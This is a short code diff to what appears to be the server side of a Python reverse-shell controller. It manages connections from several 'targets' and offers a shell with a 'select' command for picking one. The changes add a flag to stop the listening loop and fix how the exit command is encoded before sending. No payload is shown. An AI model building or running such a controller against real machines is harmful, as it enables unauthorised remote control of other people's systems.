@@ -50,7 +50,11 @@ def accept_sockets():
     del all_connections[:]
     del all_addresses[:]
 
-    while True:
+    global keep_listening
+    
+    keep_listening = True
+
+    while keep_listening:
         try:
             conn, address = s.accept();
             s.setblocking(1);
@@ -65,6 +69,7 @@ def accept_sockets():
 # Making a shell to choose from connected targets
 def start_shell():
     global s
+    global keep_listening
 
     print()
 
@@ -76,14 +81,15 @@ def start_shell():
 
         elif cmd == 'exit':
             for i, conn in enumerate(all_connections):
-                conn.send('exit')
+                conn.send(str.encode('exit'))
                 conn.close()
                 del all_connections[i]
                 del all_addresses[i]
             
             s.close()
+            keep_listening = False
             break
-        
+
         elif cmd[:6] == 'select':
             conn = get_target(cmd)
 
